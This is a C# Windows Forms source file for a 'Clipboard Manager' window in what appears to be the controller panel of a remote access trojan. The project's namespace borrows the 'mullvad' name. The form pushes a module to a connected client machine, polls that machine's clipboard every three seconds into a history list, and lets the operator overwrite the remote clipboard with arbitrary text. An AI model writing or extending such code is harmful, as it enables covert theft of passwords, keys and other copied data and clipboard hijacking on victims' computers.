using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;
using System.Text.Json;

namespace mullvad.Forms
{
    public sealed class ClipboardManagerForm : Form
    {
        private const string ModuleFile = "mullvad.Module.Clipboard";
        private const string ModuleId   = "mullvad.clipboard";

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        private readonly ListView             _lv;
        private readonly ToolStrip            _toolbar;
        private readonly ToolStripTextBox     _tbSend;
        private readonly ToolStripButton      _btnSend;
        private readonly ToolStripButton      _btnClear;
        private readonly ToolStripButton      _btnRefresh;
        private readonly StatusStrip          _status;
        private readonly ToolStripStatusLabel _statusLabel;
        private readonly System.Windows.Forms.Timer _pollTimer;

        // context menu items
        private readonly ToolStripMenuItem _menuCopyText;
        private readonly ToolStripMenuItem _menuSendToClip;
        private readonly ToolStripMenuItem _menuDeleteEntry;
        private readonly ToolStripMenuItem _menuClearAll;
        private readonly ToolStripMenuItem _menuRefresh;

        private string _lastSeen = "";

        private static readonly Dictionary<ClientHandler, ClipboardManagerForm> _openForms = new();

        public static ClipboardManagerForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new ClipboardManagerForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        private ClipboardManagerForm(ClientHandler handler)
        {
            _handler = handler;

            Text          = $"Clipboard Manager — {handler.Info.Computer}";
            Size          = new Size(680, 420);
            MinimumSize   = new Size(420, 260);
            Font          = new Font("Segoe UI", 8.25f);
            StartPosition = FormStartPosition.CenterScreen;

            TrySetIcon("page_copy.png");

            // ── Toolbar ───────────────────────────────────────────────────────
            _toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

            _btnRefresh = new ToolStripButton("Refresh") { DisplayStyle = ToolStripItemDisplayStyle.Image, ToolTipText = "Poll clipboard now" };
            SetIcon(_btnRefresh, "refresh.png");
            _btnRefresh.Click += (_, _) => _ = PollAsync();

            _btnClear = new ToolStripButton("Clear") { DisplayStyle = ToolStripItemDisplayStyle.Image, ToolTipText = "Clear history" };
            SetIcon(_btnClear, "broom.png");
            _btnClear.Click += (_, _) => ClearHistory();

            var sep1 = new ToolStripSeparator();

            _tbSend = new ToolStripTextBox
            {
                Size        = new Size(280, 22),
                AutoSize    = false,
                ToolTipText = "Text to push to client clipboard",
                Text        = "",
            };
            _tbSend.KeyDown += (_, e) => { if (e.KeyCode == Keys.Enter) _ = SendTextAsync(); };

            _btnSend = new ToolStripButton("Send") { DisplayStyle = ToolStripItemDisplayStyle.ImageAndText, ToolTipText = "Push text to client clipboard" };
            SetIcon(_btnSend, "transmit_blue.png");
            _btnSend.Click += (_, _) => _ = SendTextAsync();

            _toolbar.Items.AddRange(new ToolStripItem[] { _btnRefresh, _btnClear, sep1, _tbSend, _btnSend });

            // ── Context menu ──────────────────────────────────────────────────
            _menuCopyText    = new ToolStripMenuItem("Copy Text");
            _menuSendToClip  = new ToolStripMenuItem("Send to Client Clipboard");
            _menuDeleteEntry = new ToolStripMenuItem("Delete Entry");
            _menuClearAll    = new ToolStripMenuItem("Clear All");
            _menuRefresh     = new ToolStripMenuItem("Refresh");

            SetMenuIcon(_menuCopyText,    "page_copy.png");
            SetMenuIcon(_menuSendToClip,  "transmit_blue.png");
            SetMenuIcon(_menuDeleteEntry, "delete.png");
            SetMenuIcon(_menuClearAll,    "broom.png");
            SetMenuIcon(_menuRefresh,     "refresh.png");

            _menuCopyText.Click    += (_, _) => CopySelectedText();
            _menuSendToClip.Click  += (_, _) => _ = SendSelectedToClientAsync();
            _menuDeleteEntry.Click += (_, _) => DeleteSelected();
            _menuClearAll.Click    += (_, _) => ClearHistory();
            _menuRefresh.Click     += (_, _) => _ = PollAsync();

            var ctx = new ContextMenuStrip();
            ctx.Items.AddRange(new ToolStripItem[]
            {
                _menuCopyText, _menuSendToClip,
                new ToolStripSeparator(),
                _menuDeleteEntry, _menuClearAll,
                new ToolStripSeparator(),
                _menuRefresh,
            });
            ctx.Opening += (_, _) =>
            {
                bool hasItem = _lv.SelectedItems.Count > 0;
                _menuCopyText.Enabled    = hasItem;
                _menuSendToClip.Enabled  = hasItem;
                _menuDeleteEntry.Enabled = hasItem;
                _menuClearAll.Enabled    = _lv.Items.Count > 0;
            };

            // ── ListView ──────────────────────────────────────────────────────
            _lv = new ListView
            {
                Dock             = DockStyle.Fill,
                View             = View.Details,
                FullRowSelect    = true,
                GridLines        = false,
                MultiSelect      = false,
                Font             = new Font("Segoe UI", 9F),
                UseCompatibleStateImageBehavior = false,
                ContextMenuStrip = ctx,
            };
            _lv.Columns.Add("Time",      115);
            _lv.Columns.Add("Text",      520);
            _lv.OwnerDraw        = true;
            _lv.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            _lv.DrawItem         += (s, e) => { };
            _lv.DrawSubItem      += DrawSubItem;

            // ── Status strip ──────────────────────────────────────────────────
            _status      = new StatusStrip();
            _statusLabel = new ToolStripStatusLabel("Initialising…") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
            _status.Items.Add(_statusLabel);

            // ── Poll timer ────────────────────────────────────────────────────
            _pollTimer = new System.Windows.Forms.Timer { Interval = 3000, Enabled = false };
            _pollTimer.Tick += (_, _) => _ = PollAsync();

            Controls.Add(_lv);
            Controls.Add(_toolbar);
            Controls.Add(_status);
        }

        // ── Lifecycle ─────────────────────────────────────────────────────────

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _ = InitAsync();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _pollTimer.Stop();
            _ctx?.Dispose();
            base.OnFormClosed(e);
        }

        // ── Init / Poll ───────────────────────────────────────────────────────

        private async Task InitAsync()
        {
            SetStatus("Delivering module…");
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes is null) { SetStatus("Module not found."); return; }

                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, null, cts.Token);
                if (!ok) { SetStatus("Module delivery failed."); return; }

                _ctx = new ModuleContext(_handler, ModuleId);
                _ctx.Disconnected += (_, _) => BeginInvoke(() =>
                {
                    _pollTimer.Stop();
                    SetStatus("Client disconnected.");
                });

                await PollAsync();
                _pollTimer.Start();
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Error: {ex.Message}"));
            }
        }

        private async Task PollAsync()
        {
            if (_ctx is null) return;
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                string json = await _ctx.ExecuteAsync("poll", "", cts.Token);
                if (!IsDisposed) BeginInvoke(() => HandlePollResult(json));
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Poll error: {ex.Message}"));
            }
        }

        private void HandlePollResult(string json)
        {
            try
            {
                using var doc = JsonDocument.Parse(json);

                if (doc.RootElement.TryGetProperty("error", out var errProp))
                {
                    SetStatus($"Module error: {errProp.GetString()}");
                    return;
                }

                if (!doc.RootElement.TryGetProperty("text", out var textProp))
                {
                    SetStatus($"Unexpected response  —  {DateTime.Now:HH:mm:ss}");
                    return;
                }

                string text = textProp.GetString() ?? "";

                if (text.Length > 0 && text != _lastSeen)
                {
                    _lastSeen = text;
                    AddEntry(text);
                }

                SetStatus($"{_lv.Items.Count} entr{(_lv.Items.Count == 1 ? "y" : "ies")}  —  last polled {DateTime.Now:HH:mm:ss}");
            }
            catch (Exception ex)
            {
                SetStatus($"Parse error: {ex.Message}");
            }
        }

        // ── Entries ───────────────────────────────────────────────────────────

        private void AddEntry(string text)
        {
            string displayText = text.Replace('\r', ' ').Replace('\n', ' ');
            var item = new ListViewItem(DateTime.Now.ToString("HH:mm:ss"));
            item.SubItems.Add(displayText);
            item.Tag = text; // full text with newlines preserved

            _lv.BeginUpdate();
            _lv.Items.Insert(0, item); // newest at top
            _lv.EndUpdate();
        }

        private void ClearHistory()
        {
            _lv.Items.Clear();
            _lastSeen = "";
            SetStatus("History cleared.");
        }

        private void DeleteSelected()
        {
            if (_lv.SelectedItems.Count == 0) return;
            _lv.SelectedItems[0].Remove();
            SetStatus($"{_lv.Items.Count} entr{(_lv.Items.Count == 1 ? "y" : "ies")}");
        }

        // ── Send text to client ────────────────────────────────────────────────

        private async Task SendTextAsync()
        {
            string text = _tbSend.Text;
            if (string.IsNullOrEmpty(text) || _ctx is null) return;

            _btnSend.Enabled = false;
            SetStatus("Sending to client clipboard…");
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                string json = await _ctx.ExecuteAsync("set", text, cts.Token);
                if (!IsDisposed) BeginInvoke(() =>
                {
                    _btnSend.Enabled = true;
                    try
                    {
                        using var doc = JsonDocument.Parse(json);
                        if (doc.RootElement.TryGetProperty("error", out var e))
                        {
                            SetStatus($"Send error: {e.GetString()}");
                            return;
                        }
                    }
                    catch { }
                    _tbSend.Text = "";
                    SetStatus($"Sent to client clipboard  —  {DateTime.Now:HH:mm:ss}");
                });
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() =>
                {
                    _btnSend.Enabled = true;
                    SetStatus($"Send failed: {ex.Message}");
                });
            }
        }

        private async Task SendSelectedToClientAsync()
        {
            if (_lv.SelectedItems.Count == 0 || _ctx is null) return;
            string text = _lv.SelectedItems[0].Tag as string ?? _lv.SelectedItems[0].SubItems[1].Text;

            SetStatus("Sending to client clipboard…");
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                await _ctx.ExecuteAsync("set", text, cts.Token);
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Sent to client clipboard  —  {DateTime.Now:HH:mm:ss}"));
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Send failed: {ex.Message}"));
            }
        }

        private void CopySelectedText()
        {
            if (_lv.SelectedItems.Count == 0) return;
            string text = _lv.SelectedItems[0].Tag as string ?? _lv.SelectedItems[0].SubItems[1].Text;
            try { System.Windows.Forms.Clipboard.SetText(text); } catch { }
        }

        // ── Owner-draw ────────────────────────────────────────────────────────

        private void DrawSubItem(object? sender, DrawListViewSubItemEventArgs e)
        {
            var lv  = (ListView)sender!;
            bool sel = e.Item!.Selected && lv.Focused;
            var bg  = sel ? SystemColors.Highlight : ThemeManager.ControlColor;
            var fg  = sel ? SystemColors.HighlightText : lv.ForeColor;

            using var bgBrush = new SolidBrush(bg);
            e.Graphics.FillRectangle(bgBrush, e.Bounds);

            if (e.ColumnIndex == 0)
            {
                var img = IconLoader.Load("page_copy.png");
                int x = e.Bounds.Left + 3;
                if (img is not null)
                {
                    int iy = e.Bounds.Top + (e.Bounds.Height - 14) / 2;
                    e.Graphics.DrawImage(img, x, iy, 14, 14);
                    x += 18;
                }
                TextRenderer.DrawText(e.Graphics, e.SubItem!.Text, e.Item.Font,
                    new Rectangle(x, e.Bounds.Top, e.Bounds.Right - x, e.Bounds.Height),
                    fg, TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
            }
            else
            {
                var r = Rectangle.Inflate(e.Bounds, -3, 0);
                TextRenderer.DrawText(e.Graphics, e.SubItem!.Text, e.Item.Font, r, fg,
                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
            }
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private void SetStatus(string text)
        {
            if (InvokeRequired) { BeginInvoke(() => SetStatus(text)); return; }
            _statusLabel.Text = text;
        }

        private void TrySetIcon(string name)
        {
            var bmp = IconLoader.Load(name) as Bitmap;
            if (bmp is not null) try { Icon = Icon.FromHandle(bmp.GetHicon()); } catch { }
        }

        private static void SetIcon(ToolStripButton btn, string name)
        {
            var img = IconLoader.Load(name);
            if (img is not null) btn.Image = img;
            else btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        }

        private static void SetMenuIcon(ToolStripMenuItem item, string name)
        {
            item.Image = IconLoader.Load(name);
        }
    }
}
